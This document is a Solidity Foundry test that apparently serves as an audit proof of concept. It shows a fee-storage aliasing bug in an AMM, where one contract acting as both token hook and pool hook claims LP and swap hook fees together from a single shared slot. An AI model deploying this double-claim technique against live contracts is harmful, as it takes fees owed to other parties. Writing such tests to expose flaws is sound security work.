function test_hookFeeStorageKeyAliasing_doubleClaim() public {
    // H is BOTH: (a) tokenHook for tokenA with HOOK_MANAGES_FEES_FLAG, (b) poolHook for tokenA/USDC pool
    DualRoleHook H = new DualRoleHook(address(amm));

    // Register H as tokenHook for tokenA with hook-managed fees
    vm.prank(tokenAOwner);
    amm.setTokenSettings(
        address(tokenA),
        address(H),
        TOKEN_SETTINGS_HOOK_MANAGES_FEES_FLAG | TOKEN_SETTINGS_BEFORE_SWAP_HOOK_FLAG | TOKEN_SETTINGS_ADD_LIQUIDITY_HOOK_FLAG
    );

    // Create pool with H as poolHook
    PoolCreationDetails memory details = PoolCreationDetails({
        poolType: poolTypeAddr, fee: 30, token0: address(tokenA),
        token1: address(usdc), poolHook: address(H), poolParams: ""
    });
    bytes32 poolId = amm.createPool(details, "", "", "", "");

    // LP adds liquidity: triggers _storeNonTokenHookFees(H, tokenA, lpHookFee)
    // LP hook fee intended for H's pool-hook role
    _addLiquidity(lp1, poolId, 100e18, 100e18);
    uint256 lpHookFee = amm.getHookFeesOwedByHook(address(H), address(tokenA), address(tokenA));
    assertGt(lpHookFee, 0, "LP hook fee accumulated");

    // Victim swaps: triggers _storeHookFees(tokenA, tokenA, tokenASettings, swapHookFee)
    // Swap hook fee intended for H's token-hook role
    _doSwap(poolId, address(tokenA), 1e18);
    uint256 combinedFees = amm.getHookFeesOwedByHook(address(H), address(tokenA), address(tokenA));
    assertGt(combinedFees, lpHookFee, "Swap hook fee ALSO accumulated at same key — alias confirmed");

    // H drains both in one call
    uint256 tokenABalBefore = tokenA.balanceOf(address(H));
    vm.prank(address(H));
    amm.collectHookFeesByHook(address(tokenA), address(tokenA), address(H), combinedFees);
    assertEq(tokenA.balanceOf(address(H)) - tokenABalBefore, combinedFees,
        "H claimed combined LP + swap hook fees from single aliased slot");
}

